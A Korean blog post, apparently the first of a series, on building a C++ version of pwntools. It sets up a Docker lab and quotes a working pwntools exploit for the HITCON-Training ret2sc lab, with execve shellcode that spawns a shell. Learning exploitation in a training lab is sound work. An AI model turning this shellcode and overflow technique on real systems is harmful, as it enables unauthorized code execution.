
pwntools는 CTF에 관심있는 사람이라면 한번쯤은 들어봤을 법한 pwnable을 위한 전용 도구이다. ([https://github.com/Gallopsled/pwntools](https://github.com/Gallopsled/pwntools))

python으로 제작된 이 도구는 ctf에서 pwnable을 빠르게 진행할 수 있도록 각종 편의 기능을 보유하고 있어 매우 편리하다.
만약 비교적 최근에 pwnable을 시작한 newbie라면 hexray(IDA)와 pwntools 없이는 pwnable이 불가능할 수도 있을만큼 필수적인 도구로 자리매김하고 있다.

취미 생활로 CTF 풀이를 할 때마다 예전 버릇이 남아있어 주로 cpp로 exploit 코드를 작성하곤 했는데, 아무래도 pwntools가 엄청 편리한지라 라이브러리를 한번 찾아보게 되었다.
github에 몇 개의 비슷한 프로그램이 있기는 했지만 딱히 마음에 드는 게 없어서 직접 만들어보기로 결심하였고, 모자란 기억을 보충하기 위해 개발 히스토리를 블로그에 남겨보고자 한다.

가급적 노가다를 줄이기 위해 boost([https://www.boost.org/](https://www.boost.org/))를 이용해 개발하기로 하였다.(사실 왜 boost로 시작했는지 잘 기억은 안나는데, 매뉴얼 및 사용층이 부족한 boost를 선택한 것이 과연 노가다를 줄이기는 한 건지 좀 의심되기는 한다;;;).
그리고 프로그램의 테스트는 Hitcon-Trainning([https://github.com/scwuaptx/HITCON-Training](https://github.com/scwuaptx/HITCON-Training)) 문제를 사용하기로 했다.

### **환경 구축**

pwntoolcpp의 최종 형태는 라이브러리가 될  예정이지만 쉽고 빠르고 간단한 테스트를 위해 일단 하나의 프로그램에서 동작하도록 작성하기로 한다.
~/workspaces 아래에 ptcpp라는 디렉토리를 생성하여 docker 실행 시 연결되도록 하고, 소스 에디팅은 Host에서, compile만 docker에서 하도록 하였다.

아래 dockerfile과 run.sh를 이용해 테스트 환경을 구축하자.

```docker
FROM ubuntu:latest

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update --fix-missing \
  && apt-get -y install locales \
  && locale-gen en_US.UTF-8 \
  && apt-get -y install gcc net-tools vim nano gdb python3 wget git make procps gcc-multilib socat cmake \
                       	libpcre3-dev libdb-dev libxt-dev libxaw7-dev curl binutils nasm bash-completion \
                       	build-essential software-properties-common g++-multilib libssl-dev apport \
                       	python3-pip python-dev netcat sudo libc6-dbg-i386-cross libc6-dbg telnet \
                        libc6-i386 libboost-all-dev \
  && adduser --disabled-password --gecos '' guest \
  && echo 'guest:guest' | chpasswd \
  && wget -O /home/guest/.gdbinit-gef.py -q http://gef.blah.cat/py \
  && echo "source /home/guest/.gdbinit-gef.py" > "/home/guest/.gdbinit" \
  && echo "catch exec" | cat >> /home/guest/.gdbinit \
  && echo "set follow-fork-mode child" | cat >> /home/guest/.gdbinit \
  && chown guest:guest /home/guest/.gdbinit-gef.py /home/guest/.gdbinit \
  && python3 -m pip install --upgrade pip \
  && python3 -m pip install pwntools \
  && python3 -m pip install setuptools \
  && python3 -m pip install capstone \
  && python3 -m pip install pwntools \
  && python3 -m pip install ropgadget \
  && curl https://bootstrap.pypa.io/get-pip.py --output get-pip.py \
  && python2 get-pip.py \
  && python2 -m pip install pwntools \
  && echo "%sudo ALL=(ALL:ALL) ALL" | cat >> /etc/sudoers \
  && usermod -aG sudo guest 

RUN dpkg --add-architecture i386 \
  && git clone https://github.com/scwuaptx/HITCON-Training /tmp/hitcon

WORKDIR /home/guest/ptcpp
```

```bash
#!/bin/bash

TAG=build
HOME=/home/lucid7 **<== 수정 필요**
docker build --tag $TAG .
docker run --cap-add=SYS_PTRACE \
           --security-opt seccomp=unconfined \
           --name $TAG \
           --user guest \
           --hostname $TAG \
           --entrypoint /bin/bash \
           -it \
           --volume $HOME/workspaces/ptcpp:/home/guest/ptcpp \
           $TAG
```


약간의 시간이 흐른 후 아래와 같이 docker 개발 환경 구축이 완성된다.
![full](/assets/images/docker.png)


### **문제 확인**

HITCON LAB3 문제를 확인해보자.
해당 파일은 /tmp/hitcon 디렉토리 안에 위치해 있다.

ret2sc.c 소스를 보면 아래와 같이 가장 기초적인 문제임을 알 수 있다.
![full](/assets/images/ret2sc.c.png)


해당 문제를 검색해 보면 다음과 같은 풀이집이 있다. ([https://ii4gsp.tistory.com/97](https://ii4gsp.tistory.com/97))

아래는 해당 풀이집에서 발췌한 pwntools를 이용한 exploit code이다.
```python
from pwn import *

p = process('/home/ii4gsp/HITCON-Training/LAB/lab3/ret2sc')
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'
name = 0x804a060

p.recvuntil(':')
p.sendline(shellcode)

payload = ''
payload += '\x90' * 32
payload += p32(name)

p.recvuntil(':')
p.sendline(payload)

p.interactive()
```

위의 python 코드를 보면 ":" 문자열이 나올때까지 출력을 읽어(recvuntil) 특정 값을 쓰는(sendline) 동작을 2번 반복한 다음 마지막으로 interactive() 함수를 호출한다.

위의 exploit code에서 ret2sc 패스만 수정하여 실행해보면 아래와 같이 정상적으로 shell을 획득하는 것을 볼 수 있다.
![full](/assets/images/ret2sc.png)


지금까지 cpp를 이용한 pwntools를 제작하기 위한 개발환경 구축 및 pwntools를 이용한 exploit 코드의 기본적인 동작을 분석하였다.
다음 시간에는 위의 코드를 기반으로 pwntoolcpp를 제작해 볼 것이다.
우리가 만들어야 할 기본 기능은 process라는 클래스와 recvuntil(), sendline(), p32(), interactive() 멤버 함수이다.


